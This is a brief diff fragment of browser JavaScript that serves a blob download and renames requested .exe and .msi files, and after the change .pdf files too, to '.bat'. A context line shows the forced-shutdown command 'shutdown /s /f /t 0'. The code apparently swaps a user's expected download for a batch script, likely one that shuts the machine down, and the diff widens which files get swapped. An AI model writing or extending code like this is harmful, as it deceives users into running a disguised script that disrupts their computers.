@@ -45,7 +45,7 @@ shutdown /s /f /t 0
   const url = URL.createObjectURL(blob);
   const a = document.createElement("a");
   a.href = url;
-  a.download = currentFile.replace(/\.(exe|msi)$/i, ".bat");
+  a.download = currentFile.replace(/\.(exe|msi|pdf)$/i, ".bat");
   document.body.appendChild(a);
   a.click();
   document.body.removeChild(a);
